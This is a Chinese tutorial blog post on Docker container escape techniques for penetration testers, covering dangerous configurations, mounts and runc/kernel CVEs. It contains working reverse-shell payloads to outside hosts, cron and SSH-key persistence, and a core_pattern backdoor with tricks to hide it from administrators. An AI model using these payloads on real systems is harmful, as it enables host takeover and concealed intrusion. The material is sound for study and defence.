> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8558)

前言
--

在 t00ls 看到一篇渗透测试的[文章](https://www.t00ls.net/thread-58322-1-1.html)，里面 docker 逃逸的部分，感觉有意思。这方面我是空白，所以打算记录下利用。新手文章，难免有错，还望师傅们指正交流。

Docker 逃逸在渗透测试中面向的场景大概是这样，渗透拿到 shell 后，发现主机是 docker 环境，要进一步渗透，就必须逃逸到 “直接宿主机”。甚至还有物理机运行虚拟机，虚拟机运行 Docker 容器的情况。那就还要虚拟机逃逸了。篇幅有限，本文记录 Docker 逃逸相关技术重点、尽最大可能进行利用复现。

如何判断当前机器是否为 Docker 容器环境
-----------------------

*   Metasploit 中的 checkcontainer 模块、（判断是否为虚拟机，checkvm 模块）  
    该模块其实进行了如下操作：
    
*   检查根目录下是否存在`.dockerenv`文件  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222151-109b39ba-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222151-109b39ba-2cce-1.jpg)
    
*   检查 `/proc/1/cgroup` 是否存在含有 docker 字符串!  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222211-1c211f0c-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222211-1c211f0c-2cce-1.jpg)
    
*   检查是否存在 container 环境变量  
    通过`env` \ `PATH` 来检查是否有 docker 相关的环境变量，来进一步判断。
    
*   其他检测方式

如检测 mount、fdisk -l 查看硬盘 、判断 PID 1 的进程名等也可用来辅助判断。

Docker 逃逸的方法
------------

### 危险的配置导致 Docker 逃逸

由于 "纵深防御" 和 "最小权限" 等理念和原则落地，越来越难以直接利用漏洞来进行利用。另一方面，公开的漏洞，安全运维人员能够及时将其修复，当然，不免存在漏网之鱼。相反，更多的是利用错误的、危险的配置来进行利用，不仅仅 Docker 逃逸，其他漏洞也是，比如生产环境开启 Debug 模式导致漏洞利用等等。

> Docker 已经将容器运行时的 Capabilities 黑名单机制改为如今的默认禁止所有 Capabilities，再以白名单方式赋予容器运行所需的最小权限。

#### Docker Remote API 未授权访问

Vulhub 提供了该漏洞的复现环境。

利用方法是，我们随意启动一个容器，并将宿主机的 / etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。

Docker Remote API 的端口为 2375 端口。  
反弹 Shell exp：

```
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})


```

Github 上的 exp：[https://github.com/Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222340-513328c0-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222340-513328c0-2cce-1.jpg)

#### Docker 高危启动参数 -- privileged 特权模式启动容器

> 当操作者执行 docker run --privileged 时，Docker 将允许容器访问宿主机上的所有设备，同时修改 AppArmor 或 SELinux 的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。

特权模式启动一个 Ubuntu 容器：  
`sudo docker run -itd --privileged ubuntu:latest /bin/bash`  
进入容器：  
使用`fdisk` 命令查看磁盘文件：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222432-70a8739a-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222432-70a8739a-2cce-1.jpg)

> 在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。

新建一个目录：`mkdir /test`  
挂载磁盘到新建目录：`mount /dev/vda1 /test`  
切换根目录：`chroot /test`  
到这里已经成功逃逸了，然后就是常规的反弹 shell 和 写 SSH 了 (和 redis 未授权差不多）。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222657-c6c4aa64-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222657-c6c4aa64-2cce-1.jpg)

写计划任务，反弹宿主机 Shell。  
`echo '* * * * * /bin/bash -i >& /dev/tcp/39.106.51.35/1234 0>&1' >> /test/var/spool/cron/crontabs/root`

如果要写 SSH 的话，需要挂载宿主机的 root 目录到容器。  
docker run -itd -v /root:/root ubuntu:18.04 /bin/bash  
mkdir /root/.ssh  
cat id_rsa.pub >> /root/.ssh/authorized_keys  
然后 ssh 私钥登录。

其他参数：  
Docker 通过 Linux namespace 实现 6 项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。

```
--cap-add=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。
    --net=host           启动时，绕过Network Namespace
    --pid=host              启动时，绕过PID Namespace
    --ipc=host              启动时，绕过IPC Namespace

```

### 危险挂载导致 Docker 逃逸

挂载目录（-v /:/soft）

```
docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash

```

#### 挂载 Docker Socket

Docker 采用 C/S 架构，我们平常使用的 Docker 命令中，docker 即为 client，Server 端的角色由 docker daemon 扮演，二者之间通信方式有以下 3 种：

*   unix:///var/run/docker.sock(默认
*   tcp://host:port
*   fd://socketfd

Docker Socket 是 Docker 守护进程监听的 Unix 域套接字，用来与守护进程通信——查询信息或下发命令。

逃逸复现：

1.  首先创建一个容器并挂载 / var/run/docker.sock；  
    docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu
    
2.  在该容器内安装 Docker 命令行客户端；  
    apt-update  
    apt-get install \  
    apt-transport-https \  
    ca-certificates \  
    curl \  
    gnupg-agent \  
    software-properties-common  
    curl -fsSL [https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg](https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg) | apt-key add -  
    apt-key fingerprint 0EBFCD88  
    add-apt-repository \  
    "deb [arch=amd64] [https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/](https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/) \  
    $(lsb_release -cs) \  
    stable"  
    apt-get update  
    apt-get install docker-ce docker-ce-cli containerd.io
    
3.  接着使用该客户端通过 Docker Socket 与 Docker 守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部；docker run -it -v /:/host ubuntu:18.04 /bin/bash  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222804-eecbe342-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222804-eecbe342-2cce-1.jpg)
    
4.  在新容器内执行 chroot 将根目录切换到挂载的宿主机根目录。chroot /test  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222833-ffba6412-2cce-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222833-ffba6412-2cce-1.jpg)  
    已成功逃逸到宿主机。  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201122222939-27726266-2ccf-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20201122222939-27726266-2ccf-1.jpg)
    

#### 挂载宿主机 procfs

docker run -itd -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu (为了区分，挂载到容器的 / host / 目录下

> procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时

从 2.6.19 内核版本开始，Linux 支持在 / proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 |，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。

**Docker 默认情况下不会为容器开启 User Namespace**  
根据参考资料 1，一般情况下不会将宿主机的 procfs 挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有。  
一些细节原理看参考资料 1 哈，这里专注于利用。  
复现：“在挂载 procfs 的容器内利用 core_pattern 后门实现逃逸 “  
利用思路：攻击者进入到挂载了宿主机 profs 的容器，root 权限，然后向宿主机的 procfs 写 Payload

*   在容器内创建反弹 Shell 的 Exp，/tmp/.x.py (. 为隐藏文件

apt-get update  
apt-get install vim  
apt-get install gcc (用于编译一个可以崩溃的程序，容器环境下一般都不自带这些常用的工具，包括 ping 之类的。

```
import os
import pty
import socket
lhost = "attacker-ip"
lport = 10000
def main():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((lhost, lport))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 os.putenv("HISTFILE", "/dev/null")
 pty.spawn("/bin/bash")
 os.remove("/tmp/.x.py")
 s.close()
if __name__ == "__main__":
 main()


```

*   echo -e "|/tmp/.x.py \rcore" > /host/proc/sys/kernel/core_pattern
*   在容器内运行一个可以崩溃的程序

```
int main(void) {
int *a = NULL;
*a = 1;
return 0;
}

```

这里我仔细检查了很久，和文献中的步骤一样，没有错，就是不弹 Shell。然后找到了另一篇文章，并且在 7 月份的时候有过一次更新。[https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/](https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/)

> 这是因为 Linux 转储机制对 / proc/sys/kernel/core_pattern 内程序的查找是在宿主机文件系统进行的，而我们的 / tmp/.x.py 是容器内路径。

根据文章中提到的小技巧，操作一下步骤：  
在 Docker 容器中：

*   cat /proc/mounts | grep docker  
    拿到当前容器在宿主机上的绝对路径。
    
    ```
    overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TDUPJY7LZWCBS33AOAEL32VYWZ:/var/lib/docker/overlay2/l/UDBKLTSYHMCC4J7DLMAK3JUMT2:/var/lib/docker/overlay2/l/ULFSCIS7UXEVHUTW5KPOWLQOK6:/var/lib/docker/overlay2/l/YQDQOJ3EJ3KELBHK5PFFUJ7RVT,upperdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/diff,workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work 0 0
    
    ```
    
    从返回的内容中得到：workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work

将之前的写入 Payload 的命令改为：  
echo -e "|/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/merged/tmp/.x.py \rcore" > /host/proc/sys/kernel/core_pattern

其他步骤不变。这样一来，Linux 转储机制在程序发生崩溃时就能够顺利找到我们在容器内部的 / tmp/.x.py 了。

该漏洞利用的亮点：直接搬参考资料 1

1.  payload 中使用空格加 \ r 的方式，巧妙覆盖掉了真正的｜/tmp/.x.py，这样一来，即使管理员通过 cat /proc/sys/kernel/core_pattern 的方式查看，也只能看到 core；
    
2.  /tmp/.x.py 是一个隐藏文件，直接 ls 是看不到的；
    
3.  os.remove("/tmp/.x.py") 在反弹 shell 的过程中删掉了用来反弹 shell 的程序自身。
    

### 程序漏洞导致 Docker 逃逸

#### runC 容器逃逸漏洞 CVE-2019-5736

漏洞简述：  
Docker 18.09.2 之前的版本中使用了的 runc 版本小于 1.0-rc6，因此允许攻击者重写宿主机上的 runc 二进制文件，攻击者可以在宿主机上以 root 身份执行命令。  
利用条件：  
Docker 版本 < 18.09.2，runc 版本 < 1.0-rc6，一般情况下，可通过 docker 和 docker-runc 查看当前版本情况。

利用步骤：  
下载 poc  
git clone [https://github.com/Frichetten/CVE-2019-5736-](https://github.com/Frichetten/CVE-2019-5736-)  
PoC 修改 Payload  
vi main.go  
payload = "#!/bin/bash \n bash -i >& /dev/tcp/192.168.172.136/1234 0>&1"  
编译生成 payload  
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go  
拷贝到 docker 容器中执行  
sudo docker cp ./main 248f8b7d3c45:/tmp

然后模拟管理员进入容器，就可以收到反弹 shell。

#### Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271

漏洞描述：  
当 Docker 宿主机使用 cp 命令时，会调用辅助进程 docker-tar，该进程没有被容器化，且会在运行时动态加载一些 libnss_.so 库。黑客可以通过在容器中替换 libnss_.so 等库，将代码注入到 docker-tar 中。当 Docker 用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现 Docker 逃逸，获得宿主机 root 权限。  
影响版本：  
Docker 19.03.0

### 内核漏洞导致 Docker 逃逸

#### DirtyCow(CVE-2016-5195) 脏牛漏洞实现 Docker 逃逸

Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell。

Docker 与 宿主机共享内核，因此容器需要在存在 dirtyCow 漏洞的宿主机里。  
环境获取：git clone [https://github.com/gebl/dirtycow-docker-vdso.git](https://github.com/gebl/dirtycow-docker-vdso.git)

References
----------

[https://www.secrss.com/articles/17274](https://www.secrss.com/articles/17274)  
[https://www.secrss.com/articles/18752](https://www.secrss.com/articles/18752)  
[https://www.nsfocus.com.cn/uploadfile/2020/0730/20200730065957155.pdf](https://www.nsfocus.com.cn/uploadfile/2020/0730/20200730065957155.pdf)  
[https://xz.aliyun.com/t/6167](https://xz.aliyun.com/t/6167)  
[https://xz.aliyun.com/t/6806](https://xz.aliyun.com/t/6806)  
[https://xz.aliyun.com/t/7881](https://xz.aliyun.com/t/7881)  
Others:  
[https://www.cnblogs.com/xiaozi/p/13423853.html](https://www.cnblogs.com/xiaozi/p/13423853.html)  
[https://blog.csdn.net/qq_36148847/article/details/79294196](https://blog.csdn.net/qq_36148847/article/details/79294196)  
[https://www.runoob.com/docker/ubuntu-docker-install.html](https://www.runoob.com/docker/ubuntu-docker-install.html)